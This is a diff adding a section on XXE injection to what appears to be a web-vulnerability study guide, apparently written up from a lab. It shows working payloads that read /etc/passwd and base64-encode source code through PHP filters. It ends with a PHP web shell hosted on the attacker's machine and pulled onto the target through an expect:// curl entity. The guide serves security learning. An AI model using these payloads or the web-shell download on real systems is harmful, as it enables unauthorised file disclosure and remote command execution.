@@ -21,6 +21,7 @@ This document covers common techniques for identifying and exploiting **web vuln
 
     - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
         - [XML Overview](#xml-overview)
+        - [Local File Disclosure (LFI)](#local-file-disclosure-lfi)
 
 ---
 
@@ -620,6 +621,8 @@ Finally, by issuing a `PUT` request to modify the administrator’s email addres
 
 Due to its potential impact, XXE injection is considered one of the **OWASP Top 10 Web Security Risks**.
 
+---
+
 ### XML Overview
 
 **Extensible Markup Language (XML)** is designed for structured storage and transfer of data. Unlike HTML, which focuses on presentation, XML is primarily used to represent data in hierarchical structures.
@@ -654,7 +657,7 @@ A simple XML document may appear as follows:
 </email>
 ```
 
-In this example, <email> is the `root element`, while all other tags represent `child elements`.
+In this example, `<email>` is the `root element`, while all other tags represent `child elements`.
 
 **A Document Type Definition (DTD)** is used to define and validate the structure of an XML document. It specifies which elements are allowed, their order, and their content types.
 
@@ -789,3 +792,136 @@ Entities may also reference external resources using the `SYSTEM` keyword:
 When improperly handled, external entity resolution enables attackers to **read local files, access internal network resources, or exfiltrate data** through out-of-band channels.
 
 ---
+
+### Local File Disclosure (LFI)
+
+When an application processes **user-controlled XML input** without securely disabling external entity resolution, an attacker may be able to define **custom XML entities** that reference local system files. If the application reflects the entity output in its response, this can lead to **local file disclosure (LFI)**.
+
+**Step 1: Identify XML Input Handling**
+
+The first step in identifying XXE vulnerabilities is determining whether the target application **accepts and processes XML input**.
+
+The target application provides a `Contact Form` located at:
+
+```
+http://IP:PORT/index.php
+```
+
+![Filtered output](images/xxe.png)
+
+After submitting the form and intercepting the request in **Burp Suite**, we observe that the application sends the input using a `POST` request containing XML data to the following endpoint:
+
+```
+http://IP:PORT/submitDetails.php
+```
+
+![Filtered output](images/xxe2.png)
+
+This confirms that the application uses XML to transfer user-supplied data to the back-end server, making it a valid candidate for XXE testing. 
+
+**Step 2: Identify Reflected XML Elements**
+
+The next step is identifying whether any XML elements are **reflected in the server’s response**. To successfully exploit XXE for file disclosure, the injected entity must be referenced within an element that is displayed back to the user.
+
+Upon submitting the contact form, we observe that the `email` element is reflected in the response:
+
+```
+Check you email <email> for further instructions.
+```
+
+![Filtered output](images/xxe3.png)
+
+This makes the `email` element a suitable injection point.
+
+**Step 3: Test for XXE Injection**
+
+To verify whether an XXE vulnerability exists, we attempt to inject a **custom XML entity** and reference it within the reflected `email` element. If the application resolves and displays the entity value, XXE injection is confirmed.
+
+We define an inline XML entity:
+
+```xml
+<!DOCTYPE email [
+<!ENTITY test "You have been hacked">
+]>
+```
+
+We then reference the entity within the `email` element:
+
+```xml
+<email>
+    &test;
+</email>
+```
+
+![Filtered output](images/xxe4.png)
+
+The server response includes the injected entity value, confirming that the application resolves external entities and is therefore **vulnerable to XXE injection**.
+
+**Step 4: Exploit XXE for Local File Disclosure**
+
+With XXE confirmed, we define a new entity that references a local file using the `file://` URI scheme:
+
+```xml
+<!DOCTYPE email [
+<!ENTITY test SYSTEM "file:///etc/passwd">
+]>
+```
+
+We reference the entity as before:
+
+```xml
+<email>
+    &test;
+</email>
+```
+
+![Filtered output](images/xxe5.png)
+
+The application successfully returns the contents of `/etc/passwd`, demonstrating **local file disclosure via XXE**.
+
+![Filtered output](images/xxe6.png)
+
+The same technique can be extended using **PHP filter wrappers** to read application source code. For example, we can base64-encode the contents of `index.php`:
+
+```xml
+<!DOCTYPE email [
+<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+Reference the entity:
+
+```xml
+<email>
+    &test;
+</email>
+```
+
+![Filtered output](images/xxe7.png)
+
+The application returns the base64-encoded source code, which can then be decoded locally:
+
+![Filtered output](images/xxe8.png)
+
+In some configurations, XXE vulnerabilities can be escalated to **remote code execution**. One approach involves abusing the PHP `expect` wrapper to execute system commands.
+
+We first create a simple PHP web shell and host it on our attacking machine:
+
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
+
+sudo python3 -m http.server 8001
+```
+
+We then reference the shell using an external entity:
+
+```xml
+<!DOCTYPE email [
+<!ENTITY test SYSTEM "expect://curl$IFS-O$IFS'IP:8001/shell.php'">
+]>
+```
+
+If successful, this technique downloads the web shell to the back-end server, potentially allowing arbitrary command execution.
+
+---
+
